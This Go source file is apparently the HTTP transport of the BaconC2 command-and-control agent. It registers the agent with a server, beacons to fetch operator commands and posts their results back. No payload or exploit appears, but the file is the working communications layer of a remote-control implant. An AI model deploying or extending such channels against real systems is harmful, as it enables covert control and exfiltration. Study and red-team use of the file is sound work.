package transport

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/models"
)

const (
	registerAPIPath = "%s/api/agents/register"
)

type HTTPTransport struct {
	serverURL  string
	agentID    string
	httpClient *http.Client
}

func NewHTTPTransport(serverURL, agentID string) models.ITransportProtocol {
	return &HTTPTransport{
		serverURL:  serverURL,
		agentID:    agentID,
		httpClient: &http.Client{Timeout: 10 * time.Second},
	}
}

func (t *HTTPTransport) Initialize() error {
	return nil
}

func (t *HTTPTransport) Register(agent models.Agent) error {
	jsonData, err := json.Marshal(agent)
	if err != nil {
		return fmt.Errorf("failed to marshal agent: %w", err)
	}

	resp, err := t.httpClient.Post(fmt.Sprintf(registerAPIPath, t.serverURL), "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("HTTP registration error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("registration failed with status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

func (t *HTTPTransport) Beacon() (models.Command, error) {
	var emptyCmd models.Command

	url := fmt.Sprintf("%s/api/beacon?id=%s", t.serverURL, t.agentID)
	resp, err := t.httpClient.Post(url, "application/json", nil)
	if err != nil {
		return emptyCmd, fmt.Errorf("HTTP beacon error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return emptyCmd, fmt.Errorf("beacon failed with status %d: %s", resp.StatusCode, string(body))
	}

	var response struct {
		models.Command
		Status string `json:"status,omitempty"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		return emptyCmd, fmt.Errorf("failed to decode beacon response: %w", err)
	}

	// If only "status" is returned (e.g., "acknowledged"), return an empty command
	if response.ID == "" && response.Status == "acknowledged" {
		return emptyCmd, nil
	}

	return response.Command, nil
}

func (t *HTTPTransport) SendResult(agentID string, result models.Command) error {
	jsonData, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("failed to marshal result: %w", err)
	}

	url := fmt.Sprintf("%s/api/result?id=%s", t.serverURL, agentID)
	resp, err := t.httpClient.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("HTTP result send error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("result send failed with status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

func (t *HTTPTransport) Close() error {
	return nil // No cleanup needed for HTTP
}
